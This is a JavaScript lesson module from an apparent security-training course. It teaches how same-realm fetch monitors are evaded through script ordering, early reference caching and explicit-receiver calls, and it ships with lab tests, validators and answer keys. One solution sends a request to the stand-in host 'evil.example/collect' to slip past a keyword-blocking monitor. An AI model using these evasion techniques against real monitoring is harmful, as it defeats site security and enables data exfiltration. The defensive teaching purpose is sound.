const ORDER_SNIPPET = `// Script 1 (loaded first — attacker-controlled or compromised)
var realFetch = fetch;
self.fetch = function (url, options) {
  console.log("[hostile] wrapping fetch to", url);
  return realFetch(url, options);
};

// Script 2 (loaded second — your security monitor)
var capturedFetch = fetch;
self.fetch = function (url, options) {
  console.log("[monitor] observed fetch to", url);
  return capturedFetch(url, options);
};
`;
const ORDER_TEST = `(function () { fetch('/api/ok'); __report({}); })();`;

const CACHE_SKELETON = `// Cache a reference to fetch RIGHT NOW, into a variable named stolenFetchRef,
// before anything else has a chance to monitor it. A monitor will install itself
// AFTER this code runs and block window.fetch entirely — your cached reference
// should still work regardless.
`;
const CACHE_TEST = `(async function () {
  self.fetch = function (url, options) {
    __securityAlert('high', 'Blocked fetch to ' + url, 'late-monitor');
    return Promise.reject(new Error('blocked by late-monitor'));
  };
  var results = {};
  try {
    await stolenFetchRef('/api/ok');
    results.bypassWorked = true;
  } catch (e) {
    results.bypassWorked = false;
  }
  __report(results);
})();
`;

const RECEIVER_SETUP = `var originalFetch = fetch;
self.fetch = function (url, options) {
  if (this === undefined) {
    if (String(url).indexOf('evil') !== -1) {
      console.log('[monitor] blocked:', url);
      return Promise.reject(new Error('blocked by monitor'));
    }
  } else {
    console.log('[monitor] unrecognized call shape, skipping check');
  }
  return originalFetch.call(this, url, options);
};
`;
const RECEIVER_SKELETON = `// The monitor above only checks the URL when fetch is called the "normal" way
// (a bare call, where \`this\` is undefined in strict mode). Call fetch with the
// SAME url ("https://evil.example/collect") but with an explicit receiver, so
// the check gets skipped entirely.
`;
const RECEIVER_TEST = `(function () {
  var reached = __mockFetchCalls.some(function (c) { return c.url && String(c.url).indexOf('evil.example') !== -1; });
  __report({ reached: reached });
})();
`;

const EXAMPLE_CODE = `var originalLog = console.log;

// A "monitor" installs first...
console.log = function () {
  originalLog.call(console, '[monitored]', Array.prototype.slice.call(arguments).join(' '));
};

// ...but this code already had its OWN reference to the original, captured
// before the monitor ever ran.
var earlyReference = originalLog;
earlyReference("This bypasses the monitor entirely");
console.log("This goes through the monitor");
`;

/** @type {import('../../game/lessonSchema.js').LessonContent} */
export default {
  id: 'instrumentation-evasion',
  moduleId: 'runtime-security-instrumentation',
  title: 'How Instrumentation Gets Evaded',
  estimatedMinutes: 30,
  difficulty: 'advanced',
  prerequisites: ['wrapping-fetch-safely'],
  relatedMissionIds: ['the-false-positive'],
  skillTags: ['runtimeInstrumentation', 'threatModeling'],

  explanation: [
    'Every evasion technique in this lesson reduces to the same fact: instrumentation written in JavaScript is just more JavaScript, sharing the same realm, the same privileges, and the same lack of built-in execution-order guarantees as anything it is trying to watch. Assuming you will always run first, always get called the "normal" way, or that a captured reference stays trustworthy forever means relying on something the browser never actually promised.',
    'There is no browser-enforced guarantee about execution order between scripts sharing a page beyond whatever the page\'s own loading sequence establishes — "I captured a pristine reference" only means something if it happened before anything hostile ran, and nothing enforces that ordering for you. Similarly, "this function was called normally" is a claim about the call site\'s mechanics — receiver, arguments — which the caller fully controls: a bare call like `fetch(url)` has `this === undefined` inside a strict-mode function, but calling through `fn.call(explicitReceiver, ...)` changes that trivially, defeating any check that assumes the bare-call shape.',
    'One way to get a trustworthy reference despite this: a freshly created same-origin iframe has its own, completely separate realm with its own untouched built-ins — patching `window.fetch` in the main page never touches the corresponding object in a different realm, because they were never the same object. This technique\'s limit is its dependency: it only helps against tampering that already happened in the main page\'s realm, and it still requires the DOM APIs used to build the iframe to themselves be trustworthy.',
    'Put these together and "we have a fetch monitor" is a weaker claim than it sounds: a compromised script that loads early can win the reference-capture race, call through an explicit receiver to dodge a naive check, and use `sendBeacon` instead of `fetch` to sidestep a fetch-only monitor — none of it exotic, just standard behavior combined deliberately, and the honest answer to "can this be bypassed" is never a flat no. Realistic defenses layer several things instead of relying on one trick: being the literal first script the page loads wins the reference-capture race deterministically (a deployment decision, not a technique), and checking calling convention catches unsophisticated bypasses cheaply but should never be the only check — the more durable signal is behavioral, what URL a request targets and what data it carries, which is harder for an attacker to dodge than matching an expected call shape.',
  ],

  distinctions: [
    { label: 'ECMAScript spec', text: 'A bare function call has this === undefined inside a strict-mode function, rather than defaulting to the global object — precise, specified behavior, and exactly the mechanic the receiver-bypass lab exploits.' },
    { label: 'Simplified model', text: '"Capturing a pristine reference protects it" is only true relative to a point in time — it protects your own code\'s ability to reach the real implementation from then on, and is worthless if captured after hostile code already ran.' },
    { label: 'Browser-provided', text: 'None of these techniques defeat an actual browser-enforced boundary like cross-origin realm isolation — they defeat JavaScript-level defenses implemented as ordinary same-realm code.' },
  ],

  tldr: [
    'Instrumentation written in JavaScript shares the same realm and privileges as anything it\'s watching — there is no built-in guarantee it runs, or captures references, before untrusted code does.',
    'A reference captured after hostile code has already run is not pristine — reference capture is a race, not a guarantee.',
    'A separate realm (a fresh same-origin iframe) has its own genuinely distinct built-ins, untouched by whatever the main page\'s realm has had patched — that is what makes the clean-realm technique work, and also its limit.',
    'None of these techniques defeat an actual browser-enforced boundary like realm isolation — they defeat same-realm JavaScript defenses, which is why "can this be bypassed" never has a flat no.',
  ],

  example: {
    runner: 'worker',
    code: EXAMPLE_CODE,
    predictPrompt: 'A monitor wraps console.log. Predict whether the "early reference" call actually goes through the monitor or bypasses it, and why.',
  },
  panels: ['trace'],

  labs: [
    {
      id: 'predict-reference-poisoning',
      title: 'Predict: does execution order poison the capture?',
      type: 'predict',
      instructions: 'Two scripts run in this exact order. Read them, then predict whether the second script\'s "captured" reference is actually the real native fetch.',
      runner: 'worker',
      submissionMode: 'answer',
      sourceCode: ORDER_SNIPPET,
      initialCode: '',
      testScript: `${ORDER_SNIPPET}\n${ORDER_TEST}`,
      answerSchema: [
        { id: 'pristine', prompt: 'Is capturedFetch (inside "your" monitor) the real, untouched native fetch?', type: 'boolean' },
        { id: 'why', prompt: 'Why?', type: 'text' },
      ],
      validate(answers) {
        const correct = answers.pristine === 'false';
        const why = (answers.why ?? '').toLowerCase();
        const explained = ['first', 'already', 'order', 'ran before', 'earlier'].some((k) => why.includes(k));
        const score = (correct ? 0.6 : 0) + (explained ? 0.4 : 0);
        return { passed: correct && explained, score: { correctness: score, security: score }, feedback: [] };
      },
      hints: [
        'By the time "your" script runs `var capturedFetch = fetch;`, has anything already changed what the name `fetch` points to?',
        'The hostile script ran FIRST and already reassigned `self.fetch` to its own wrapper — "your" script captures whatever `fetch` currently is at that moment, which is already the hostile version, not the native one.',
      ],
      solution: 'No — `capturedFetch` is the hostile script\'s wrapper, not the real native fetch, because the hostile script ran first and already replaced the global before the monitor script ever executed.',
      explanation: 'This is the entire reason "capture pristine references as early as possible" matters as a specific, urgent instruction rather than a nice-to-have: a reference captured after untrusted code has already run is not pristine at all, no matter how confidently the capturing code believes it is.',
    },
    {
      id: 'bypass-via-early-cache',
      title: 'Break it: use a cached reference to bypass a later monitor',
      type: 'break',
      instructions: 'Cache fetch before anything else runs. A monitor will install itself afterward and block fetch entirely — but your cached reference should still work.',
      runner: 'worker',
      submissionMode: 'code',
      initialCode: CACHE_SKELETON,
      testScript: CACHE_TEST,
      validate(runResult) {
        if (runResult.error) return { passed: false, score: { correctness: 0 }, feedback: [`Error: ${runResult.error}`] };
        const passed = !!runResult.returnValue?.bypassWorked;
        return { passed, score: { correctness: passed ? 1 : 0 }, feedback: [passed ? 'The cached reference bypassed the later monitor.' : 'The cached reference did not work — was it captured before the monitor installed?'] };
      },
      hints: [
        'This only requires one line: `var stolenFetchRef = fetch;` — placed before anything else has a chance to change what `fetch` refers to.',
        'The variable name matters here (the test script looks for `stolenFetchRef` specifically) — but the concept is what matters: whoever captures a reference FIRST controls whether it\'s trustworthy.',
      ],
      solution: 'var stolenFetchRef = fetch;',
      explanation: 'This is the mirror image of the previous lab, from the other side: whoever gets to run first and cache a reference "wins," regardless of which side (defender or attacker) they\'re on. It\'s why real instrumentation has to be injected as early as technically possible — ideally before any other page script has a chance to execute at all.',
    },
    {
      id: 'bypass-via-receiver',
      title: 'Break it: bypass a receiver-dependent check',
      type: 'break',
      instructions: 'The monitor below only checks the URL when fetch is called as a plain, bare call. Get "https://evil.example/collect" through anyway.',
      runner: 'worker',
      submissionMode: 'code',
      setupScript: RECEIVER_SETUP,
      initialCode: RECEIVER_SKELETON,
      testScript: RECEIVER_TEST,
      validate(runResult) {
        if (runResult.error) return { passed: false, score: { correctness: 0 }, feedback: [`Error: ${runResult.error}`] };
        const passed = !!runResult.returnValue?.reached;
        return { passed, score: { correctness: passed ? 1 : 0 }, feedback: [passed ? 'The request reached the destination, bypassing the check.' : 'The request was still blocked (or never sent).'] };
      },
      hints: [
        'In strict mode, a plain call like `fetch(url)` has `this === undefined` inside the function — that\'s specifically the case the monitor checks for.',
        'Calling through `.call()`/`.apply()` with ANY explicit receiver (even `{}` or `self`) makes `this` something other than `undefined`, skipping the check entirely: `fetch.call(self, "https://evil.example/collect")`.',
      ],
      solution: `fetch.call(self, 'https://evil.example/collect');`,
      explanation: 'A receiver-dependent check is a check on HOW a function was called, not WHAT it was called with — and the caller fully controls both. This is a specific instance of a general rule: any security decision based on incidental call-site mechanics rather than the actual data/behavior is trivially steerable by whoever controls the call site.',
    },
  ],

  knowledgeCheck: [
    { id: 'kc-timing', question: 'Why is "capture native references as early as possible" not a complete solution on its own?', modelAnswer: 'It only protects reference capture from that moment forward — if any untrusted code (even accidentally, e.g. another legitimate script) runs before the capture, the "pristine" reference is already compromised. There\'s no browser-level guarantee of script execution order beyond what the page\'s own loading sequence establishes, so this is fundamentally a race, not a guarantee — real protection against a genuinely first-loaded hostile script requires injecting instrumentation even earlier than page script execution, e.g. via mechanisms outside page JavaScript entirely.', skillTag: 'runtimeInstrumentation' },
    { id: 'kc-clean-realm', question: 'A "clean iframe realm" technique creates a fresh iframe purely to harvest untampered native references. Does this retroactively fix an already-tampered main-page global?', modelAnswer: 'No. It gives you a pristine COPY of the native function from a separate, untouched realm, which you can then use INSTEAD of the (possibly tampered) main-page global going forward — but it does not repair or replace what the main page\'s own global currently points to for any OTHER code still calling it by name. It\'s a way to get a trustworthy reference for your own use, not a cure for the page\'s shared global state.', skillTag: 'runtimeInstrumentation' },
  ],

  interviewQuestions: [
    'Why does the order in which scripts execute matter so much for the trustworthiness of a "captured native reference"?',
    'Describe a way a naive security check based on the calling convention (arguments, receiver) can be bypassed, with a concrete example.',
    'Does any of this evasion defeat an actual browser-enforced security boundary? Why or why not?',
  ],
};
